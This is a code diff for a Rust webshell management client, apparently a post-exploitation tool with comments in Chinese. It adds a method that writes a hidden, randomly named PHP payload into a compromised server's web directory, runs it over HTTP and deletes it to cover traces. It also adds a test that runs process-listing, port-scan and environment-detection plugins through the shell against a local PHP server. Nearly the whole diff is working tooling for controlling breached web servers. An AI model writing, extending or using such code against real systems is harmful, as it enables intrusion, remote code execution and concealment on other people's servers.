@@ -28,7 +28,7 @@ use dosword_sdk::domain::{
 use super::transport::build_client;
 use dosword_sdk::encoder::{EncoderRegistry, NativeEncoder, PayloadEncoder};
 use dosword_sdk::{PluginKind, PluginManifest, ProtocolPlugin};
-use dosword_sdk::{Protocol, ProtocolError, SessionState};
+use dosword_sdk::{FeaturePlugin, Protocol, ProtocolError, SessionState};
 
 pub const PHP_PROTOCOL_ID: &str = "builtin.php.v1";
 
@@ -324,7 +324,7 @@ impl PhpProtocol {
         content: &[u8],
         settings: &AppSettings,
     ) -> Result<(), ProtocolError> {
-        session_call(
+        dispatch(
             php,
             "write",
             &[("p", path), ("d", &B64.encode(content))],
@@ -395,7 +395,7 @@ impl PhpProtocol {
         sql: &str,
         settings: &AppSettings,
     ) -> Result<DbQueryResult, ProtocolError> {
-        let value = session_call(
+        let value = dispatch(
             php,
             "dbquery",
             &[("c", &conn_json(connection)), ("q", sql)],
@@ -615,6 +615,69 @@ impl Protocol for PhpProtocol {
 
     fn requires_network(&self) -> bool {
         true
+    }
+
+    fn run_code(
+        &self,
+        session: &dyn SessionState,
+        language: &str,
+        code: &str,
+        settings: &AppSettings,
+    ) -> Result<String, ProtocolError> {
+        let php = session
+            .as_any()
+            .downcast_ref::<PhpSession>()
+            .expect("会话类型不匹配");
+        if language != "php" {
+            return Err(ProtocolError::NotSupported(format!(
+                "PHP 协议暂不支持 {language} 代码执行"
+            )));
+        }
+        // 1) 获取目标当前目录（写临时载荷用）
+        let cwd = self
+            .execute_command(session, "pwd 2>/dev/null", settings)?
+            .stdout
+            .trim()
+            .to_string();
+        if cwd.is_empty() {
+            return Err(ProtocolError::ServerError(
+                "无法获取目标当前目录（pwd 失败）".to_string(),
+            ));
+        }
+        // 2) 随机文件名 + 写入载荷
+        let name = format!(".dsw_{:x}.php", uuid::Uuid::new_v4().simple());
+        let path = format!("{cwd}/{name}");
+        self.write_file(session, &path, code.as_bytes(), settings)?;
+        // 3) HTTP 请求执行（同目录 URL）
+        let mut url = url::Url::parse(&php.endpoint)
+            .map_err(|error| ProtocolError::ParseError(format!("Endpoint 解析失败：{error}")))?;
+        let new_path = url
+            .path()
+            .rsplit_once('/')
+            .map(|(dir, _)| format!("{dir}/{name}"))
+            .unwrap_or_else(|| format!("/{name}"));
+        url.set_path(&new_path);
+        let response = php
+            .client
+            .get(url)
+            .timeout(std::time::Duration::from_secs(
+                settings.default_timeout_secs.max(10) as u64,
+            ))
+            .send()
+            .map_err(|error| ProtocolError::Network(error.to_string()))?;
+        if !response.status().is_success() {
+            let _ = self.delete_path(session, &path, settings);
+            return Err(ProtocolError::HttpStatus(
+                response.status().as_u16(),
+                "载荷执行失败：目标无法访问临时脚本（当前目录与文档根不一致或不可写）".to_string(),
+            ));
+        }
+        let text = response
+            .text()
+            .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
+        // 4) 清理临时载荷
+        let _ = self.delete_path(session, &path, settings);
+        Ok(text)
     }
 
     fn probe(
@@ -1618,6 +1681,49 @@ mod tests {
         }
     }
 
+    #[test]
+    fn real_php_feature_plugins() {
+        // 功能插件真实执行：进程 / 端口扫描 / PHP 环境检测（依赖 run_code 通道）
+        let settings = settings();
+        let Some((url, dir, mut child)) = spawn_php_server_with("native", "secret", false) else {
+            eprintln!("跳过：未检测到 php");
+            return;
+        };
+        let mut profile = profile(&url);
+        profile.protocol_params = r#"{"encoder":"native"}"#.to_string();
+        let result = (|| -> Result<(), ProtocolError> {
+            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
+            let php = session.as_any().downcast_ref::<PhpSession>().expect("会话类型不匹配");
+            let protocol = PhpProtocol;
+            // 通用：进程详情（命令通道）
+            let out = dosword_sdk::feature_plugins::ProcessesPlugin
+                .execute(&protocol, php, "php", &serde_json::json!({}), &settings)?;
+            let stdout = out["stdout"].as_str().unwrap_or("");
+            assert!(!stdout.is_empty(), "进程列表不应为空");
+            eprintln!("[plugin] processes {} 字节", stdout.len());
+            // 通用：端口扫描（代码通道，扫本机开放端口）
+            let scan = dosword_sdk::feature_plugins::PortScanPlugin.execute(
+                &protocol,
+                php,
+                "php",
+                &serde_json::json!({"host": "127.0.0.1", "ports": "80,443,3306,8080,22", "timeout": 1}),
+                &settings,
+            )?;
+            let open = scan["open"].as_array().map(|a| a.len()).unwrap_or(0);
+            eprintln!("[plugin] port_scan open={open}");
+            // PHP 专用：环境检测
+            let env = dosword_sdk::feature_plugins::PhpEnvPlugin
+                .execute(&protocol, php, "php", &serde_json::json!({}), &settings)?;
+            assert!(env["php_version"].as_str().is_some(), "应返回 php_version");
+            eprintln!("[plugin] php_env {}", env["php_version"].as_str().unwrap_or(""));
+            Ok(())
+        })();
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
+        result.unwrap_or_else(|error| panic!("功能插件真实执行应成功：{error}"));
+    }
+
     // --- Level B：真实 PHP 往返（本机装有 php 时执行） ---
 
     /// 在本机临时目录写入指定编码器生成的 stub 并起 `php -S`，
@@ -1668,6 +1774,7 @@ mod tests {
             .arg(format!("127.0.0.1:{port}"))
             .arg("-t")
             .arg(&dir)
+            .current_dir(&dir)
             .stdout(std::process::Stdio::null())
             .stderr(std::process::Stdio::from(
                 std::fs::File::create(std::env::temp_dir().join("srv.log")).ok()?,
